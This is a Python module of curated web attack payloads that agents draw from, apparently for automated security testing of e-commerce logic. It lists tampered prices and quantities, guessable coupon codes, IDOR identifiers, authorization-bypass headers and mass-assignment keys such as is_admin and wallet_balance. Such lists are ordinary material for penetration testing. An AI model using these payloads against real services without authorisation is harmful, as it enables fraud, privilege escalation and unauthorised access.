"""
Curated business-logic payload sets. Values only — agents pick.
"""
from __future__ import annotations

from typing import Any


NUMERIC_TAMPER = [
    "-1", "-100", "-0.01", "0", "0.0", "0.0001",
    "1e-3", "1e9", "999999999999", "NaN", "Infinity", "-Infinity",
    "1.999999999", "2.000000001", "1,000", "1_000",
]

COUPON_SHAPE = [
    "TEST", "TEST10", "FREE100", "WELCOME", "FIRSTORDER",
    "SAVE50", "SWIGGY50", "FLAT100", "0", "null",
    "admin", "internal", "debug", "test_only",
]

CURRENCY = ["INR", "USD", "EUR", "GBP", "inr", "usd", "0", "XX", "BTC"]

QUANTITY = [
    "-1", "0", "0.5", "1.5", "100", "1000000",
    "1e10", "2147483647", "2147483648", "9999999999999999999",
]

IDOR_SHAPE = ["1", "0", "-1", "admin", "me", "self", "null", "undefined"]

AUTH_BYPASS_HEADERS = [
    {"X-Forwarded-For": "127.0.0.1"},
    {"X-Forwarded-Host": "localhost"},
    {"X-Original-URL": "/admin"},
    {"X-Rewrite-URL": "/admin"},
    {"X-HTTP-Method-Override": "PUT"},
    {"X-User-Id": "1"},
    {"X-Admin": "true"},
    {"Authorization": ""},
]

MASS_ASSIGN_KEYS = [
    "is_admin", "role", "user_type", "wallet_balance", "credit",
    "discount_percent", "coupon_applied", "payment_status",
    "order_status", "price", "total", "subtotal",
]


PAYLOADS: dict[str, list[Any]] = {
    "numeric_tamper": NUMERIC_TAMPER,
    "coupon_shape": COUPON_SHAPE,
    "currency": CURRENCY,
    "quantity": QUANTITY,
    "idor_shape": IDOR_SHAPE,
    "auth_bypass_headers": AUTH_BYPASS_HEADERS,
    "mass_assign_keys": MASS_ASSIGN_KEYS,
}


def load_payload(name: str) -> list[Any]:
    if name not in PAYLOADS:
        raise KeyError(f"unknown payload set: {name}")
    return list(PAYLOADS[name])
